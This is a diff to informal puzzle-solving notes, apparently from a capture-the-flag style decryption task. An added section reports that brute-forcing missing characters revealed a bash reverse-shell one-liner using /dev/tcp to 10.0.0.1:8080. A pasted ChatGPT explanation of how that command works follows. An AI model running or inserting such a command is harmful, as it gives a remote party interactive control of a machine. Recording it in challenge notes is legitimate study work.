@@ -4,3 +4,17 @@ wants me to decrypt a key for something
 
 ok so im just going to brute force attempt keys until it spits me out a reasonable bit of data
 ok so we arent brute forcing it because there are 10^26 new bits to do
+
+
+jamies addon:
+
+bruteforced replacing _ with a letter
+got bash command "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
+
+chatgpt notes: 
+Yes, the command bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 is valid in Bash, and it creates a reverse shell. Here's what it does:
+
+bash -i: Starts an interactive Bash shell.
+>& /dev/tcp/10.0.0.1/8080: Redirects both standard output and standard error to a TCP connection to the IP address 10.0.0.1 on port 8080.
+0>&1: Redirects standard input from the same TCP connection, allowing the remote machine to send commands to the shell.
+This command is often used in security contexts, but it can also be exploited by attackers, so be cautious with its usage.
